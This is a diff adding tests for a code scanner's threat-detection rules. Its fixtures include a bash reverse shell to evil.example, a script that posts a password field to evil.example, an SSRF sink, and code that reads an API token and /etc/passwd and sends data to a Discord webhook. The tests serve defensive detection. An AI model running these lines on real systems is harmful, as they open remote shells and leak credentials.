@@ -188,6 +188,89 @@ describe("language-aware rules", () => {
   });
 });
 
+describe("threat-family rules", () => {
+  it("flags reverse shells as Critical network-attack", async () => {
+    const root = await createProject({
+      "pwn.sh": "bash -i >& /dev/tcp/evil.example/4444 0>&1\n"
+    });
+    const inventory = await buildInventory(root);
+    const findings = runRules(inventory);
+
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        category: "network-attack",
+        riskLevel: "Critical",
+        filePath: "pwn.sh",
+        confidence: "High",
+        evidenceTags: expect.arrayContaining(["reverse-shell"])
+      })
+    );
+  });
+
+  it("flags credential harvesting as Critical phishing", async () => {
+    const root = await createProject({
+      "phish.js": 'document.getElementById("password").value; fetch("https://evil.example/steal", {method:"POST", body: p});\n'
+    });
+    const inventory = await buildInventory(root);
+    const findings = runRules(inventory);
+
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        category: "phishing",
+        riskLevel: "Critical",
+        filePath: "phish.js"
+      })
+    );
+  });
+
+  it("flags an SSRF sink as High network-attack", async () => {
+    const root = await createProject({
+      "app.py": "import requests\nrequests.get(target_url)\n"
+    });
+    const inventory = await buildInventory(root);
+    const findings = runRules(inventory);
+
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        category: "network-attack",
+        riskLevel: "High",
+        filePath: "app.py",
+        evidenceTags: expect.arrayContaining(["ssrf"])
+      })
+    );
+  });
+
+  it("cross-file exfiltration: sensitive source in one file + webhook sink in another", async () => {
+    const root = await createProject({
+      "src/collector.ts": "const token = process.env.API_TOKEN; readFileSync('/etc/passwd');\n",
+      "scripts/upload.ts": 'fetch("https://discord.com/api/webhooks/123/abc", {method:"POST", body: data});\n'
+    });
+    const inventory = await buildInventory(root);
+    const findings = runRules(inventory);
+
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        category: "data-exfiltration",
+        riskLevel: "High",
+        filePath: "scripts/upload.ts",
+        evidenceTags: expect.arrayContaining(["webhook", "exfiltration-candidate"])
+      })
+    );
+  });
+
+  it("does not flag a lone webhook with no sensitive source as exfiltration candidate", async () => {
+    const root = await createProject({
+      "scripts/upload.ts": 'fetch("https://discord.com/api/webhooks/123/abc", {method:"POST", body: "hello"});\n'
+    });
+    const inventory = await buildInventory(root);
+    const findings = runRules(inventory);
+    const exfil = findings.filter((f) => f.category === "data-exfiltration");
+
+    expect(exfil).toHaveLength(1);
+    expect(exfil[0].evidenceTags).not.toContain("exfiltration-candidate");
+  });
+});
+
 async function createProject(files: Record<string, string>): Promise<string> {
   const rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "rules-test-"));
 
